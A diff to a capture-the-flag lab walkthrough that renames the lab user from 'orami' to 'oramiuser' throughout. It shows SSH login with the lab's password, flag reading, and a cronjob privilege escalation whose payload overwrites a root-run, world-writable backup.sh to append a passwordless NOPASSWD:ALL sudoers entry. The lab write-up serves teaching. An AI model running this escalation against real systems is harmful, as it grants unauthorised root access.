@@ -66,14 +66,14 @@ File content: `credentials: oramiuser:123456`
 ### Step 3: SSH access
 
 ```
-ssh orami@<VM_IP>
+ssh oramiuser@<VM_IP>
 Password: 123456
 ```
 
 Get the first flag:
 
 ```
-cat /home/orami/user.txt
+cat /home/oramiuser/user.txt
 ```
 
 ### Step 4: Why look for cronjobs after initial access?
@@ -129,7 +129,7 @@ This reveals 3 conditions that create the vulnerability:
 
 1. A cronjob runs `backup.sh` as **root** every minute
 2. The script has **777** permissions (any user can modify it)
-3. As orami you can overwrite the script and cron will execute it with root privileges
+3. As oramiuser you can overwrite the script and cron will execute it with root privileges
 
 ### Step 6: Cronjob exploitation
 
@@ -154,10 +154,10 @@ whoami
 
 **Option B (sudoers - more direct)**
 
-Adds orami to the sudoers file to run any command without a password.
+Adds oramiuser to the sudoers file to run any command without a password.
 
 ```
-echo -e '#!/bin/bash\nchmod 777 /etc/sudoers\necho "orami ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\nchmod 440 /etc/sudoers' > /usr/local/bin/backup.sh
+echo -e '#!/bin/bash\nchmod 777 /etc/sudoers\necho "oramiuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\nchmod 440 /etc/sudoers' > /usr/local/bin/backup.sh
 chmod +x /usr/local/bin/backup.sh
 ```
 
@@ -211,7 +211,7 @@ The `backup.sh` script has 777 permissions, meaning **any user on the system** c
 
 The exploitation follows this logic:
 
-1. orami overwrites `backup.sh` with a malicious payload
+1. oramiuser overwrites `backup.sh` with a malicious payload
 2. The cronjob detects 1 minute has passed and executes the script as root
 3. The payload runs with root privileges
 4. The attacker gains root access or the flag directly
@@ -246,7 +246,7 @@ The container exposes:
 To connect:
 ```
 ftp -p localhost 2121
-ssh orami@localhost -p 2222
+ssh oramiuser@localhost -p 2222
 ```
 
 Stop and remove:
